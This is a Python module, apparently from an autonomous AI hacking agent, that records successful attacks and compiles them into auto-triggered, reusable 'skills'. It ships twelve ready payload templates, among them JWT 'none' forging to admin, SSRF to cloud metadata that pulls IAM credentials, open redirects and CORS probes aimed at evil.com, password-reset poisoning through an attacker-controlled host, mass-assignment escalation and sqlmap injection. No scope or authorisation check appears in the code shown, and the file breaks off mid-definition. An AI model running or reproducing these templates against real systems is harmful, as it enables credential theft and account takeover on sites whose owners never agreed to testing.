"""Procedural memory - compiles successful attack traces into reusable skill subroutines.

When the agent successfully exploits a vulnerability, the entire attack trace
(hypothesis -> tool calls -> observations -> finding) gets distilled into a
"procedural skill" that can be replayed or adapted on future targets.

Skills persist across sessions via SQLite and trigger automatically when their
tech_stack trigger conditions match the current target context.
"""

from __future__ import annotations

import hashlib
import json
import re
import sqlite3
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# Schema
# ---------------------------------------------------------------------------

_SCHEMA = """
CREATE TABLE IF NOT EXISTS attack_traces (
    id TEXT PRIMARY KEY,
    target TEXT NOT NULL,
    technique TEXT NOT NULL,
    steps TEXT NOT NULL,
    finding_severity TEXT NOT NULL,
    tech_stack TEXT NOT NULL,
    timestamp TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS procedural_skills (
    skill_id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    technique_category TEXT NOT NULL,
    trigger_conditions TEXT NOT NULL,
    steps TEXT NOT NULL,
    success_rate REAL DEFAULT 0.0,
    avg_severity REAL DEFAULT 0.0,
    times_used INTEGER DEFAULT 0,
    times_succeeded INTEGER DEFAULT 0,
    last_used TEXT DEFAULT '',
    source_targets TEXT NOT NULL DEFAULT '[]'
);

CREATE INDEX IF NOT EXISTS idx_skills_technique ON procedural_skills(technique_category);
CREATE INDEX IF NOT EXISTS idx_traces_technique ON attack_traces(technique);
"""

# Severity -> numeric weight for averaging
_SEVERITY_WEIGHT: dict[str, float] = {
    "critical": 10.0,
    "high": 8.0,
    "medium": 5.0,
    "low": 2.0,
    "informational": 1.0,
    "info": 1.0,
}


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------

@dataclass
class AttackTrace:
    """Raw recording of a successful attack."""
    target: str
    technique: str
    steps: list[dict[str, Any]]  # [{tool, inputs, output_summary, success}]
    finding_severity: str
    tech_stack: dict[str, Any]
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def trace_id(self) -> str:
        """Deterministic ID for dedup."""
        key = f"{self.target}|{self.technique}|{self.timestamp}"
        return hashlib.sha256(key.encode()).hexdigest()[:16]


@dataclass
class SkillStep:
    """A single step in a procedural skill."""
    tool: str
    input_template: dict[str, Any]   # With {target}, {endpoint} placeholders
    expected_pattern: str             # Regex to match in output for success
    fallback_tool: str = ""           # Alternative tool if this step fails
    is_essential: bool = True         # False = nice-to-have, can skip


@dataclass
class ProceduralSkill:
    """Compiled, reusable attack procedure."""
    skill_id: str
    name: str                          # e.g., "JWT_alg_confusion_on_express"
    technique_category: str
    trigger_conditions: dict[str, Any] # tech_stack patterns that activate this
    steps: list[SkillStep]
    success_rate: float = 0.0
    avg_severity: float = 5.0
    times_used: int = 0
    times_succeeded: int = 0
    last_used: str = ""
    source_targets: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        """Serialize to JSON-compatible dict."""
        d = asdict(self)
        # steps are already dataclass-converted via asdict; keep them as dicts
        return d

    @classmethod
    def from_dict(cls, d: dict[str, Any]) -> "ProceduralSkill":
        """Deserialize from a dict (e.g., loaded from DB or JSON)."""
        steps = [
            SkillStep(
                tool=s["tool"],
                input_template=s["input_template"],
                expected_pattern=s["expected_pattern"],
                fallback_tool=s.get("fallback_tool", ""),
                is_essential=s.get("is_essential", True),
            )
            for s in d.get("steps", [])
        ]
        return cls(
            skill_id=d["skill_id"],
            name=d["name"],
            technique_category=d["technique_category"],
            trigger_conditions=d["trigger_conditions"],
            steps=steps,
            success_rate=d.get("success_rate", 0.0),
            avg_severity=d.get("avg_severity", 5.0),
            times_used=d.get("times_used", 0),
            times_succeeded=d.get("times_succeeded", 0),
            last_used=d.get("last_used", ""),
            source_targets=d.get("source_targets", []),
        )


# ---------------------------------------------------------------------------
# Generalisation helpers
# ---------------------------------------------------------------------------

# Patterns that should be replaced with placeholders when compiling a skill
_GENERALISE_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"https?://[^\s\"']+"), "{target_url}"),
    (re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b"), "{target_ip}"),
    (re.compile(r"Bearer\s+[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+"), "Bearer {jwt_token}"),
    (re.compile(r'"Authorization"\s*:\s*"[^"]+"'), '"Authorization": "{auth_header}"'),
    (re.compile(r"/api/v\d+/[a-z]+/\d+"), "/api/{version}/{resource}/{id}"),
    (re.compile(r"\buser_?id[=:]\s*\d+", re.IGNORECASE), "user_id={user_id}"),
]


def _generalise_value(value: Any) -> Any:
    """Replace target-specific literals with placeholders in a value."""
    if isinstance(value, str):
        for pattern, placeholder in _GENERALISE_PATTERNS:
            value = pattern.sub(placeholder, value)
        return value
    if isinstance(value, dict):
        return {k: _generalise_value(v) for k, v in value.items()}
    if isinstance(value, list):
        return [_generalise_value(item) for item in value]
    return value


def _step_is_essential(step: dict[str, Any], all_steps: list[dict[str, Any]]) -> bool:
    """Heuristically determine whether a step is essential to the attack chain."""
    tool = step.get("tool", "")
    success = step.get("success", True)
    # Recon/passive steps are optional; active exploit steps are essential
    optional_tools = {"whois", "dns_lookup", "shodan_query", "wayback_fetch", "passive_recon"}
    if tool in optional_tools:
        return False
    if not success:
        return False
    # Steps explicitly marked as critical stay essential
    if step.get("critical", False):
        return True
    return True


# ---------------------------------------------------------------------------
# Seed skills
# ---------------------------------------------------------------------------

def _build_seed_skills() -> list[ProceduralSkill]:
    """Return 12 pre-compiled skills for common attack patterns."""

    def _skill(skill_id: str, name: str, category: str, triggers: dict,
                steps: list[SkillStep], severity: float = 7.0) -> ProceduralSkill:
        return ProceduralSkill(
            skill_id=skill_id,
            name=name,
            technique_category=category,
            trigger_conditions=triggers,
            steps=steps,
            success_rate=0.0,   # Unknown until tried
            avg_severity=severity,
            times_used=0,
            times_succeeded=0,
            last_used="",
            source_targets=["seed"],
        )

    seeds: list[ProceduralSkill] = []

    # 1. JWT algorithm confusion (none / RS256->HS256) on Node.js
    seeds.append(_skill(
        "seed_jwt_alg_confusion_node",
        "JWT_alg_confusion_on_express",
        "auth_bypass",
        {"framework": ["express", "node", "fastify"], "auth": ["jwt"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/user/profile", "method": "GET",
                                 "headers": {"Authorization": "Bearer {jwt_token}"}},
                expected_pattern=r"(200|401|403)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="jwt_modify",
                input_template={"token": "{jwt_token}", "algorithm": "none",
                                 "payload_patch": {"role": "admin"}},
                expected_pattern=r"eyJ[A-Za-z0-9\-_]+\.",
            ),
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/user/profile", "method": "GET",
                                 "headers": {"Authorization": "Bearer {modified_jwt}"}},
                expected_pattern=r"(admin|200)",
                fallback_tool="curl_request",
            ),
        ],
        severity=9.0,
    ))

    # 2. IDOR via sequential numeric IDs on REST APIs
    seeds.append(_skill(
        "seed_idor_sequential_ids",
        "IDOR_sequential_numeric_ids_REST",
        "idor",
        {"api_style": ["rest"], "id_type": ["integer", "sequential"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/{resource_path}/1", "method": "GET",
                                 "headers": {"Authorization": "{auth_header}"}},
                expected_pattern=r"(200|data|id)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="idor_fuzz",
                input_template={"base_url": "{target_url}/{resource_path}/",
                                 "id_range": [1, 50],
                                 "own_id": "{own_user_id}",
                                 "headers": {"Authorization": "{auth_header}"}},
                expected_pattern=r"200",
                is_essential=True,
            ),
            SkillStep(
                tool="compare_responses",
                input_template={"own_response": "{own_resource_response}",
                                 "other_response": "{other_resource_response}"},
                expected_pattern=r"(differ|mismatch|IDOR)",
                fallback_tool="manual_diff",
            ),
        ],
        severity=7.0,
    ))

    # 3. SSRF via URL parameter to cloud metadata
    seeds.append(_skill(
        "seed_ssrf_cloud_metadata",
        "SSRF_url_param_to_cloud_metadata",
        "ssrf",
        {"cloud": ["aws", "gcp", "azure"], "input_type": ["url_parameter", "webhook", "import"]},
        [
            SkillStep(
                tool="param_discover",
                input_template={"url": "{target_url}", "method": "GET",
                                 "param_names": ["url", "redirect", "fetch", "load",
                                                  "src", "path", "file", "callback"]},
                expected_pattern=r"(param|query|url)",
                fallback_tool="manual_param_probe",
                is_essential=False,
            ),
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}?{url_param}=http://169.254.169.254/latest/meta-data/",
                                 "method": "GET"},
                expected_pattern=r"(ami-id|instance|hostname|169\.254)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}?{url_param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                 "method": "GET"},
                expected_pattern=r"(AccessKeyId|SecretAccessKey|Token)",
            ),
        ],
        severity=9.5,
    ))

    # 4. Open redirect via OAuth callback parameter
    seeds.append(_skill(
        "seed_open_redirect_oauth",
        "Open_redirect_via_OAuth_callback",
        "open_redirect",
        {"auth_flow": ["oauth", "oauth2", "oidc"], "endpoints": ["callback", "redirect"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/oauth/callback?redirect_uri=https://evil.com",
                                 "method": "GET", "follow_redirects": False},
                expected_pattern=r"(Location|302|301|evil\.com)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="redirect_chain",
                input_template={"start_url": "{target_url}/oauth/authorize",
                                 "params": {"client_id": "{client_id}",
                                             "redirect_uri": "https://evil.com",
                                             "response_type": "code"}},
                expected_pattern=r"evil\.com",
            ),
        ],
        severity=6.0,
    ))

    # 5. Admin panel discovery on Django / Rails / Laravel
    seeds.append(_skill(
        "seed_admin_panel_discovery",
        "Admin_panel_discovery_Django_Rails_Laravel",
        "recon",
        {"framework": ["django", "rails", "laravel", "flask"]},
        [
            SkillStep(
                tool="path_probe",
                input_template={"base_url": "{target_url}",
                                 "paths": ["/admin", "/admin/", "/django-admin", "/wp-admin",
                                            "/administrator", "/manage", "/backend",
                                            "/rails/info", "/telescope", "/horizon",
                                            "/nova", "/filament", "/admin/dashboard"]},
                expected_pattern=r"(200|admin|login|dashboard)",
                fallback_tool="ffuf_scan",
                is_essential=True,
            ),
            SkillStep(
                tool="http_probe",
                input_template={"url": "{admin_url}",
                                 "method": "GET",
                                 "check_auth": True},
                expected_pattern=r"(login|sign.in|password|200)",
                fallback_tool="curl_request",
                is_essential=False,
            ),
        ],
        severity=5.0,
    ))

    # 6. GraphQL introspection data leak
    seeds.append(_skill(
        "seed_graphql_introspection",
        "GraphQL_introspection_data_leak",
        "information_disclosure",
        {"api_style": ["graphql"], "endpoints": ["/graphql", "/api/graphql", "/query"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/graphql",
                                 "method": "POST",
                                 "body": {"query": "{__schema{types{name}}}"},
                                 "headers": {"Content-Type": "application/json"}},
                expected_pattern=r"(__schema|types|QueryType)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="graphql_introspect",
                input_template={"endpoint": "{target_url}/graphql",
                                 "dump_full_schema": True},
                expected_pattern=r"(mutation|Query|Mutation|fields)",
            ),
        ],
        severity=5.5,
    ))

    # 7. CORS misconfiguration on API endpoints
    seeds.append(_skill(
        "seed_cors_misconfig",
        "CORS_misconfiguration_API",
        "cors",
        {"api_style": ["rest", "graphql"], "headers": ["Access-Control-Allow-Origin"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/",
                                 "method": "GET",
                                 "headers": {"Origin": "https://evil.com",
                                              "Authorization": "{auth_header}"}},
                expected_pattern=r"Access-Control-Allow-Origin:\s*(evil\.com|\*)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/",
                                 "method": "GET",
                                 "headers": {"Origin": "https://evil.com.{target_domain}",
                                              "Authorization": "{auth_header}"}},
                expected_pattern=r"Access-Control-Allow-Origin:\s*evil\.com\.",
                is_essential=False,
            ),
            SkillStep(
                tool="cors_validator",
                input_template={"endpoint": "{target_url}/api/",
                                 "auth_header": "{auth_header}",
                                 "test_origins": ["https://evil.com",
                                                   "null",
                                                   "https://evil.com.{target_domain}"]},
                expected_pattern=r"(CORS_VULN|allow-credentials.*true)",
            ),
        ],
        severity=7.0,
    ))

    # 8. Rate limit bypass via header manipulation
    seeds.append(_skill(
        "seed_rate_limit_bypass_headers",
        "Rate_limit_bypass_via_header_manipulation",
        "auth_bypass",
        {"protection": ["rate_limit", "brute_force_protection", "account_lockout"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/auth/login",
                                 "method": "POST",
                                 "body": {"username": "{username}", "password": "wrong"},
                                 "headers": {"X-Forwarded-For": "1.2.3.{counter}",
                                              "X-Real-IP": "1.2.3.{counter}"}},
                expected_pattern=r"(401|invalid|incorrect)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="rate_limit_probe",
                input_template={"url": "{target_url}/api/auth/login",
                                 "method": "POST",
                                 "rotate_headers": ["X-Forwarded-For", "X-Real-IP",
                                                     "CF-Connecting-IP", "True-Client-IP"],
                                 "request_count": 50},
                expected_pattern=r"(bypass|200|success|no_block)",
            ),
        ],
        severity=6.5,
    ))

    # 9. Debug endpoint exposure on Spring / Express
    seeds.append(_skill(
        "seed_debug_endpoint_exposure",
        "Debug_endpoint_exposure_Spring_Express",
        "information_disclosure",
        {"framework": ["spring", "spring-boot", "express", "node"],
         "env": ["production", "staging", "prod"]},
        [
            SkillStep(
                tool="path_probe",
                input_template={"base_url": "{target_url}",
                                 "paths": ["/actuator", "/actuator/env", "/actuator/health",
                                            "/actuator/mappings", "/actuator/beans",
                                            "/__debug__", "/debug", "/console",
                                            "/env", "/info", "/metrics",
                                            "/status", "/swagger-ui.html",
                                            "/v2/api-docs", "/v3/api-docs"]},
                expected_pattern=r"(200|actuator|beans|env|swagger)",
                fallback_tool="ffuf_scan",
            ),
            SkillStep(
                tool="http_probe",
                input_template={"url": "{debug_endpoint_url}", "method": "GET"},
                expected_pattern=r"(password|secret|key|token|env|config)",
                is_essential=False,
            ),
        ],
        severity=6.0,
    ))

    # 10. Host header injection - password reset poisoning
    seeds.append(_skill(
        "seed_host_header_pw_reset",
        "Host_header_injection_password_reset_poisoning",
        "host_header_injection",
        {"features": ["password_reset", "forgot_password", "account_recovery"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/auth/forgot-password",
                                 "method": "POST",
                                 "body": {"email": "{victim_email}"},
                                 "headers": {"Host": "attacker-collaborator.{oob_domain}",
                                              "X-Forwarded-Host": "attacker-collaborator.{oob_domain}"}},
                expected_pattern=r"(200|email.sent|check.your.email)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="oob_listener",
                input_template={"domain": "{oob_domain}", "wait_seconds": 30},
                expected_pattern=r"(DNS|HTTP|request|hit)",
            ),
        ],
        severity=8.0,
    ))

    # 11. Mass assignment via extra JSON fields
    seeds.append(_skill(
        "seed_mass_assignment",
        "Mass_assignment_extra_JSON_fields",
        "privilege_escalation",
        {"framework": ["rails", "laravel", "express", "django", "spring"],
         "api_style": ["rest", "json_api"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/user/profile",
                                 "method": "PUT",
                                 "body": {"name": "test",
                                           "role": "admin",
                                           "is_admin": True,
                                           "admin": True,
                                           "permission_level": 9},
                                 "headers": {"Authorization": "{auth_header}",
                                              "Content-Type": "application/json"}},
                expected_pattern=r"(200|updated|success)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/user/profile",
                                 "method": "GET",
                                 "headers": {"Authorization": "{auth_header}"}},
                expected_pattern=r"(admin|role.*admin|is_admin.*true)",
            ),
        ],
        severity=8.0,
    ))

    # 12. SQL injection via search / filter parameters
    seeds.append(_skill(
        "seed_sqli_search_param",
        "SQLi_search_filter_parameter",
        "sqli",
        {"database": ["mysql", "postgres", "mssql", "sqlite", "oracle"],
         "input_type": ["search", "filter", "sort", "order"]},
        [
            SkillStep(
                tool="http_probe",
                input_template={"url": "{target_url}/api/search?q=test'",
                                 "method": "GET",
                                 "headers": {"Authorization": "{auth_header}"}},
                expected_pattern=r"(error|syntax|sql|ORA-|mysql_fetch|pg_query|500)",
                fallback_tool="curl_request",
            ),
            SkillStep(
                tool="sqlmap_scan",
                input_template={"url": "{target_url}/api/search",
                                 "param": "q",
                                 "level": 2,
                                 "risk": 1,
                                 "headers": {"Authorization": "{auth_header}"}},
                expected_pattern=r"(injectable|payload|vulnerable)",
                fallback_tool="manual_sqli_probe",
            ),
        ],
        severity=9.0,
    ))

    return seeds


# ---------------------------------------------------------------------------
# ProceduralMemory
# ---------------------------------------------------------------------------

class ProceduralMemory:
    """SQLite-backed store for procedural attack skills that persist across sessions.

    Skills are compiled from successful attack traces, generalised with variable
    placeholders, and matched against the current target's tech_stack at runtime.
    """

    def __init__(self, data_dir: Path) -> None:
        self.data_dir = Path(data_dir)
        self.data_dir.mkdir(parents=True, exist_ok=True)
        db_path = self.data_dir / "procedural_memory.db"
        self.conn = sqlite3.connect(str(db_path))
        self.conn.row_factory = sqlite3.Row
        self.conn.executescript(_SCHEMA)
        self._ensure_seed_skills()

    # ------------------------------------------------------------------
    # Core recording
    # ------------------------------------------------------------------

    def record_trace(self, trace: AttackTrace) -> None:
        """Record a successful attack trace for later compilation."""
        trace_id = trace.trace_id()
        self.conn.execute(
            """INSERT OR IGNORE INTO attack_traces
               (id, target, technique, steps, finding_severity, tech_stack, timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (
                trace_id,
                trace.target,
                trace.technique,
                json.dumps(trace.steps),
                trace.finding_severity,
                json.dumps(trace.tech_stack),
                trace.timestamp,
            ),
        )
        self.conn.commit()

    # ------------------------------------------------------------------
    # Skill compilation
    # ------------------------------------------------------------------

    def compile_skill(self, trace: AttackTrace) -> ProceduralSkill:
        """Distill an attack trace into a reusable procedural skill.

        - Generalises target-specific values into placeholders.
        - Identifies which steps were essential vs optional.
        - Upserts into the skills table (merges if same technique already exists).
        """
        record_first = True
        existing = self._load_skill_by_technique(trace.technique)
        if existing:
            skill = self._update_existing_skill(existing, trace)
            record_first = False
        else:
            skill = self._build_new_skill(trace)

        self._save_skill(skill)
        if record_first:
            self.record_trace(trace)
        return skill

    def _build_new_skill(self, trace: AttackTrace) -> ProceduralSkill:
        """Create a brand-new ProceduralSkill from a trace."""
        raw_steps = trace.steps
        generalised_steps: list[SkillStep] = []

        for raw in raw_steps:
            tool = raw.get("tool", "unknown")
            inputs = _generalise_value(raw.get("inputs", {}))
            output_summary = raw.get("output_summary", "")
            # Extract a simple regex from the output summary
            pattern = self._extract_pattern(output_summary)
            essential = _step_is_essential(raw, raw_steps)
            generalised_steps.append(SkillStep(
                tool=tool,
                input_template=inputs,
                expected_pattern=pattern,
                fallback_tool=raw.get("fallback_tool", ""),
                is_essential=essential,
            ))

        # Derive trigger_conditions from tech_stack
        triggers = self._derive_triggers(trace.tech_stack)

        # Build a readable name: technique + primary tech
        primary_tech = next(iter(trace.tech_stack.values()), "unknown")
        if isinstance(primary_tech, list):
            primary_tech = primary_tech[0] if primary_tech else "unknown"
        clean_technique = trace.technique.replace(" ", "_").replace("/", "_")
        clean_tech = str(primary_tech).replace(" ", "_")
        name = f"{clean_technique}_on_{clean_tech}"

        skill_id = hashlib.sha256(
            f"{trace.technique}|{json.dumps(triggers, sort_keys=True)}".encode()
        ).hexdigest()[:16]

        sev_weight = _SEVERITY_WEIGHT.get(trace.finding_severity.lower(), 5.0)

        return ProceduralSkill(
            skill_id=skill_id,
            name=name,
            technique_category=self._categorise_technique(trace.technique),
            trigger_conditions=triggers,
            steps=generalised_steps,
            success_rate=0.0,
            avg_severity=sev_weight,
            times_used=0,
            times_succeeded=0,
            last_used="",
            source_targets=[trace.target],
        )

    def _update_existing_skill(
        self, existing: ProceduralSkill, trace: AttackTrace
    ) -> ProceduralSkill:
        """Merge a new trace into an existing skill."""
        if trace.target not in existing.source_targets:
            existing.source_targets.append(trace.target)
        sev_weight = _SEVERITY_WEIGHT.get(trace.finding_severity.lower(), 5.0)
        n = len(existing.source_targets)
        existing.avg_severity = (existing.avg_severity * (n - 1) + sev_weight) / n
        # Expand trigger conditions with new tech stack info
        new_triggers = self._derive_triggers(trace.tech_stack)
        for key, val in new_triggers.items():
            if key in existing.trigger_conditions:
                current = existing.trigger_conditions[key]
                if isinstance(current, list) and isinstance(val, list):
                    merged = list(set(current + val))
                    existing.trigger_conditions[key] = merged
            else:
                existing.trigger_conditions[key] = val
        return existing

    def _extract_pattern(self, output_summary: str) -> str:
        """Derive a simple regex pattern from a step's output summary."""
        if not output_summary:
            return r".*"
        # Pull quoted strings as candidate literals
        quoted = re.findall(r'"([^"]{2,30})"', output_summary)
        if quoted:
            escaped = [re.escape(q) for q in quoted[:3]]
            return "(" + "|".join(escaped) + ")"
        # Fall back to first meaningful word
        words = re.findall(r"[A-Za-z_]{4,}", output_summary)
        if words:
            return re.escape(words[0])
        return r".*"

    def _derive_triggers(self, tech_stack: dict[str, Any]) -> dict[str, Any]:
        """Convert a raw tech_stack dict into normalised trigger_conditions."""
        triggers: dict[str, Any] = {}
        for key, val in tech_stack.items():
            normalised_key = key.lower().replace("-", "_").replace(" ", "_")
            if isinstance(val, str):
                triggers[normalised_key] = [val.lower()]
            elif isinstance(val, list):
                triggers[normalised_key] = [str(v).lower() for v in val]
            else:
                triggers[normalised_key] = val
        return triggers

    def _categorise_technique(self, technique: str) -> str:
        """Map a technique string to a broad category."""
        t = technique.lower()
        if any(k in t for k in ("sqli", "sql injection", "injection")):
            return "sqli"
        if any(k in t for k in ("xss", "cross-site script")):
            return "xss"
        if "ssrf" in t:
            return "ssrf"
        if "idor" in t:
            return "idor"
        if any(k in t for k in ("jwt", "auth bypass", "oauth", "saml")):
            return "auth_bypass"
        if any(k in t for k in ("cors", "cross-origin")):
            return "cors"
        if any(k in t for k in ("open redirect", "redirect")):
            return "open_redirect"
        if any(k in t for k in ("lfi", "path traversal", "rfi", "file inclusion")):
            return "file_inclusion"
        if any(k in t for k in ("ssti", "template injection")):
            return "ssti"
        if any(k in t for k in ("xxe", "xml")):
            return "xxe"
        if any(k in t for k in ("privilege", "mass assign", "escalation")):
            return "privilege_escalation"
        if any(k in t for k in ("recon", "discovery", "enumeration", "fingerprint")):
            return "recon"
        if any(k in t for k in ("info", "disclosure", "leak", "exposure")):
            return "information_disclosure"
        return "other"

    # ------------------------------------------------------------------
    # Skill lookup
    # ------------------------------------------------------------------

    def find_applicable_skills(
        self, tech_stack: dict[str, Any], endpoint: str
    ) -> list[ProceduralSkill]:
        """Return skills whose trigger_conditions match the current context.

        Matching logic: a skill matches if at least one of its trigger condition
        key-value pairs is satisfied by the provided tech_stack. Skills are
        returned ordered by (match_score DESC, success_rate DESC).
        """
        all_skills = self._load_all_skills()
        scored: list[tuple[float, ProceduralSkill]] = []

        normalised_stack: dict[str, list[str]] = {}
        for k, v in tech_stack.items():
            nk = k.lower().replace("-", "_").replace(" ", "_")
            if isinstance(v, list):
                normalised_stack[nk] = [str(i).lower() for i in v]
            else:
                normalised_stack[nk] = [str(v).lower()]

        for skill in all_skills:
            score = self._match_score(skill.trigger_conditions, normalised_stack, endpoint)
            if score > 0:
                scored.append((score + skill.success_rate * 0.1, skill))

        scored.sort(key=lambda x: x[0], reverse=True)
        return [s for _, s in scored]

    def _match_score(
        self,
        conditions: dict[str, Any],
        stack: dict[str, list[str]],
        endpoint: str,
    ) -> float:
        """Return a match score (0 = no match, >0 = partial or full match)."""
        if not conditions:
            return 0.0
        total = len(conditions)
        matched = 0
        for cond_key, cond_val in conditions.items():
            stack_vals = stack.get(cond_key, [])
            if not stack_vals:
                continue
            if isinstance(cond_val, list):
                if any(cv in stack_vals for cv in cond_val):
                    matched += 1
            elif str(cond_val).lower() in stack_vals:
                matched += 1
        # Endpoint hints - bonus point if endpoint name suggests the category
        endpoint_lower = endpoint.lower()
        for cond_key, cond_val in conditions.items():
            vals = cond_val if isinstance(cond_val, list) else [str(cond_val)]
            if any(v in endpoint_lower for v in vals):
                matched += 0.5
        return matched / total if total > 0 else 0.0

    def get_skill_hypotheses(
        self, skills: list[ProceduralSkill], target: str
    ) -> list[dict[str, Any]]:
        """Convert applicable skills into hypothesis dicts for the attack graph."""
        hypotheses: list[dict[str, Any]] = []
        for skill in skills:
            h_id = hashlib.sha256(f"{target}|{skill.skill_id}".encode()).hexdigest()[:16]
            hypotheses.append({
                "id": h_id,
                "technique": skill.name,
                "description": (
                    f"Procedural skill '{skill.name}' matches target tech stack. "
                    f"Success rate: {skill.success_rate:.0%} over {skill.times_used} uses."
                ),
                "source": "procedural_memory",
                "skill_id": skill.skill_id,
                "steps": [asdict(s) for s in skill.steps],
                "estimated_severity": skill.avg_severity,
                "exploitability": min(10.0, skill.success_rate * 10 + 5),
                "novelty": max(1.0, 10.0 - skill.times_used * 0.5),
            })
        return hypotheses

    # ------------------------------------------------------------------
    # Stats and maintenance
    # ------------------------------------------------------------------

    def update_skill_stats(self, skill_id: str, succeeded: bool) -> None:
        """Update success rate after a skill is used."""
        row = self.conn.execute(
            "SELECT times_used, times_succeeded FROM procedural_skills WHERE skill_id = ?",
            (skill_id,),
        ).fetchone()
        if not row:
            return
        used = row["times_used"] + 1
        succ = row["times_succeeded"] + (1 if succeeded else 0)
        rate = succ / used
        self.conn.execute(
            """UPDATE procedural_skills
               SET times_used = ?, times_succeeded = ?, success_rate = ?, last_used = ?
               WHERE skill_id = ?""",
            (used, succ, rate, datetime.now().isoformat(), skill_id),
        )
        self.conn.commit()

    def merge_similar_skills(self) -> int:
        """Merge skills that target the same technique on the same tech stack.

        Keeps the version with the highest success_rate. Returns the number
        of skills removed during the merge.
        """
        all_skills = self._load_all_skills()
        # Group by (technique_category, trigger_conditions_hash)
        groups: dict[str, list[ProceduralSkill]] = {}
        for skill in all_skills:
            group_key = (
                skill.technique_category
                + "|"
                + hashlib.md5(
                    json.dumps(skill.trigger_conditions, sort_keys=True).encode()
                ).hexdigest()[:8]
            )
            groups.setdefault(group_key, []).append(skill)

        removed = 0
        for group_skills in groups.values():
            if len(group_skills) <= 1:
                continue
            # Keep the highest success_rate; ties broken by times_used
            group_skills.sort(
                key=lambda s: (s.success_rate, s.times_used), reverse=True
            )
            keeper = group_skills[0]
            for duplicate in group_skills[1:]:
                # Merge source_targets into keeper
                for t in duplicate.source_targets:
                    if t not in keeper.source_targets:
                        keeper.source_targets.append(t)
                keeper.times_used += duplicate.times_used
                keeper.times_succeeded += duplicate.times_succeeded
                if keeper.times_used > 0:
                    keeper.success_rate = keeper.times_succeeded / keeper.times_used
                self.conn.execute(
                    "DELETE FROM procedural_skills WHERE skill_id = ?",
                    (duplicate.skill_id,),
                )
                removed += 1
            self._save_skill(keeper)

        self.conn.commit()
        return removed

    # ------------------------------------------------------------------
    # Summary / export / import
    # ------------------------------------------------------------------

    def get_skill_summary(self) -> str:
        """Human-readable summary of all learned skills."""
        skills = self._load_all_skills()
        if not skills:
            return "No procedural skills in memory."
        lines = [f"Procedural Skills ({len(skills)} total):", ""]
        for s in sorted(skills, key=lambda x: x.avg_severity, reverse=True):
            status = (
                f"{s.success_rate:.0%} success ({s.times_succeeded}/{s.times_used})"
                if s.times_used > 0
                else "untested"
            )
            lines.append(
                f"  [{s.technique_category.upper()}] {s.name}"
            )
            lines.append(
                f"    ID: {s.skill_id} | Severity: {s.avg_severity:.1f} | {status}"
            )
            lines.append(
                f"    Triggers: {json.dumps(s.trigger_conditions)}"
            )
            lines.append(
                f"    Steps: {len(s.steps)} | Sources: {', '.join(s.source_targets[:3])}"
            )
            lines.append("")
        return "\n".join(lines)

    def export_skills(self) -> list[dict[str, Any]]:
        """Export all skills as JSON-serializable dicts."""
        return [s.to_dict() for s in self._load_all_skills()]

    def import_skills(self, skills: list[dict[str, Any]]) -> int:
        """Import skills from another agent/session.

        Skips skills whose skill_id already exists. Returns count imported.
        """
        imported = 0
        for skill_dict in skills:
            try:
                skill = ProceduralSkill.from_dict(skill_dict)
            except (KeyError, TypeError):
                continue
            existing_row = self.conn.execute(
                "SELECT skill_id FROM procedural_skills WHERE skill_id = ?",
                (skill.skill_id,),
            ).fetchone()
            if existing_row:
                continue
            self._save_skill(skill)
            imported += 1
        return imported

    # ------------------------------------------------------------------
    # Internal DB helpers
    # ------------------------------------------------------------------

    def _save_skill(self, skill: ProceduralSkill) -> None:
        """Upsert a skill into the database."""
        self.conn.execute(
            """INSERT OR REPLACE INTO procedural_skills
               (skill_id, name, technique_category, trigger_conditions, steps,
                success_rate, avg_severity, times_used, times_succeeded, last_used,
                source_targets)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                skill.skill_id,
                skill.name,
                skill.technique_category,
                json.dumps(skill.trigger_conditions),
                json.dumps([asdict(s) for s in skill.steps]),
                skill.success_rate,
                skill.avg_severity,
                skill.times_used,
                skill.times_succeeded,
                skill.last_used,
                json.dumps(skill.source_targets),
            ),
        )
        self.conn.commit()

    def _load_all_skills(self) -> list[ProceduralSkill]:
        """Load every skill from the database."""
        rows = self.conn.execute("SELECT * FROM procedural_skills").fetchall()
        return [self._row_to_skill(row) for row in rows]

    def _load_skill_by_technique(self, technique: str) -> ProceduralSkill | None:
        """Find an existing skill whose name contains the technique string."""
        row = self.conn.execute(
            "SELECT * FROM procedural_skills WHERE name LIKE ?",
            (f"%{technique.replace(' ', '_')}%",),
        ).fetchone()
        return self._row_to_skill(row) if row else None

    @staticmethod
